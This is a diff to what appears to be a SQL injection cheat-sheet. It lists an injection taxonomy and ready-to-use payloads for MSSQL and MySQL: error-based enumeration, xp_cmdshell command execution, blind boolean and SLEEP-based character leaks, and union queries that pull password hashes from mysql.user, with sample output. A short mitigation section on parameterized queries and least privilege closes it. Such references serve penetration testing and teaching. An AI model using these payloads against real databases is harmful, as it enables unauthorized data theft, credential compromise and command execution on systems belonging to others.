@@ -8,19 +8,19 @@ SQLI impact
     MsSql: Code execution
 
 Taxonomy
-    Inband error based
+    Inband **error** based
         The syntax error is shown in the response and it can be used to get results, may be enough to enumerate the db.
 
-    Inband union based:
+    Inband **union** based:
         Union operator to combine the results with another query and enumerate
 
-    Blind Boolean based
+    Blind **boolean** based
         You can not trigger any database output in the response, but cause differences in the app behaviour (true/false).
 
-    Blind time based
+    Blind **time** based
         Same as Boolean based, but causing a time delay rather than significant response differences.
 
-    Outband
+    **Outband**
         The query is executed in another thread/process and no side effects in the inband response can be produce. Test it with a ping back.
 
 Identifying SQLI
@@ -56,20 +56,27 @@ MsSql Exploitation
         *convert(int,user_name())--
 convert(int, @@db_name())--*
 
-        If the DB runs as sa, you can run **XP_CMDSHELL** to get code execution.
+    If the DB runs as SA, you can run **XP_CMDSHELL** to get code execution.
 
     Useful queries:
-        **SELECT Distinct TABLE_NAME FROM information_schema.TABLES*
-exec master.dbo.xp_cmdshell 'CMD'**
+        *SELECT Distinct TABLE_NAME FROM information_schema.TABLES
+exec master.dbo.xp_cmdshell 'CMD'*
 
-    MsSqlI blind exploitation
+MsSqlI blind exploitation
     For numeric contexts (look for differences):
         *and 1=1
 and 1=2*
 
     Once we found the injection, we can leak data from the DB by guessing one character at a time as follows:
-        **AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109**
+    *AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109*
     if it is true, we know the db_name starts with 109(m).
+
+MySql blind data exfiltration
+    Ask if the first character of the user is 'a':
+    *and if(substring (user(),1,1)=’a’,SLEEP(5),1)--”*
+
+    Check if the admin table exists:
+    *and IF(SUBSTRING ((select 1 from admin limit 0,1),1,1)=1,SLEEP(5),1)*
 
 
 Finding number of columns using ORDER BY
@@ -129,13 +136,14 @@ id=1 union all select 1,2,3
     *?id=1 union all select 1,2,3,4,5 from XXX
 Table 'gallery.XXX' doesn't existCould not select category*
     You can use a comment *#* to finish the query, in case there is a group by after the context of the injection. You can select the users and passwords form the database with:
-    *id=1+union+all+(select+1,2,3,4,5,6+from+mysql.user)%23*
+    *id=1 union all (select 1,2,3,4,5,6 from mysql.user)#*
 
     Leak the password:
-    *1+union+(select+password,2,3,4,5,6+from+mysql.user)%23
- You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*47FB3B1E573D80F44CD198DC65DE7764795F948E) order by dateuploaded desc limit 1' at line 1*
+    *1 union (select password,2,3,4,5,6 from mysql.user)#*
+    Should produce:
+    *You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*47FB3B1E573D80F44CD198DC65DE7764795F948E) order by dateuploaded desc limit 1' at line 1*
 
-Mysql exploitation
+Mysql data exfiltration
     Find current user
     *SELECT user();
 SELECT system_user();*
@@ -150,11 +158,6 @@ SELECT distinct(db) FROM mysql.db*
     *SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
     List tables
     *SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
-    Asking if the first character of the user is 'a':
-    *and if(substring (user(),1,1)=’a’,SLEEP(5),1)--”*
-
-    Checking if the admin table exists:
-    *and IF(SUBSTRING ((select 1 from admin limit 0,1),1,1)=1,SLEEP(5),1)*
 
 MySql in-band, union based SQLI exploitation
     Enumerate user
@@ -251,3 +254,16 @@ Object to relational mapping (ORM) injection
     *\'
 \"
 OR 1--*
+
+Mitigation
+    Parameterized Queries
+    *"SELECT * FROM foo WHERE bar = ? ".setString( 1, var);*
+    Stored Procedures (with parameterized queries)
+    *connection.prepareCall("{call sp_getAccountBalance(?)}").setString(1, custname);*
+    White List Input Validation
+    Escaping All User Supplied Input
+    Additional defenses
+        Least Privilege
+        White List Input Validation
+        Views
+        SQL views to further increase the granularity of access by limiting the read access to specific fields of a table or joins of tables
